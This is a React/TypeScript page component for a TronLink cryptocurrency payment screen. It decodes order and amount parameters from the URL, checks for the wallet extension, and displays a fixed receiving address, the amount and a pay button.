import { definePageConfig, useSearchParams } from 'ice';
import { useState, useEffect, useRef } from 'react';
import { Button } from '@alifd/next';
import { useInterval } from 'ahooks';

import { base64URLDecode, parseParamMapFromUrl } from '@/utils';

import styles from './index.module.css';

export default function Flow() {
  const [searchParams] = useSearchParams();

  const platformRef = useRef('');
  const [platform, setPlatform] = useState('');

  const [pageParams, setPageParams] = useState({
    orderStr: '',
    amountStr: '',
  });
  const [platformMatched, setPlatformMatched] = useState(false);

  const clearUseInterval = useInterval(() => {
    if (platformRef.current === 'tronlink') {
      if ((window as any).tronLink) {
        clearUseInterval?.();
        setPlatformMatched(true);
        // Message.show({
        //   type: 'success',
        //   align: 'cc cc',
        //   content: 'TronLink钱包',
        // });
      } else {
        // Message.show({
        //   type: 'warning',
        //   align: 'cc cc',
        //   content: '请先安装TronLink钱包',
        // });
        // clearUseInterval?.();
      }
    } else {
      clearUseInterval?.();
    }
  }, 1_000);

  useEffect(() => {
    const encodeStr = searchParams.get('_');

    const fUrl = `https://x.com?${base64URLDecode(encodeStr)}`;
    const { orderStr, amountStr, platform } = parseParamMapFromUrl(fUrl);
    const plt = platform || '';
    platformRef.current = plt;
    setPlatform(plt);
    setPageParams({
      orderStr: orderStr || '',
      amountStr: amountStr || '',
    });

    if (['tronlink'].includes(platformRef.current) === false) {
      // 不是需要尝试的目标平台，清除
      clearUseInterval?.();
    }
  }, []);

  return (
    <div className={styles.pageContainer}>
      <div className={styles.itemLabel}>收款地址</div>
      <div className={`${styles.itemValue} gl-cls-block`}>
        TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t
      </div>
      <div className={styles.itemLabel}>金额</div>
      <div className={`${styles.itemValue} gl-cls-block`}>
        {pageParams.amountStr}
      </div>
      <div className={styles.payBtnWrap}>
        <Button
          type="primary"
          size="large"
          className={styles.payBtn}
          style={{
            height: '46px',
            backgroundColor: `var(--${platform}-color)`,
            borderRadius: `var(--${platform}-borderradius)`,
          }}
        >
          立即支付
        </Button>
      </div>
      {platformMatched ? null : (
        <div className={styles.pageNotMatched}>
          <span className={styles.pageNotMatchedTxt}>Loading...</span>
        </div>
      )}
    </div>
  );
}

export const pageConfig = definePageConfig(() => {
  return {
    title: '立即支付',
  };
});
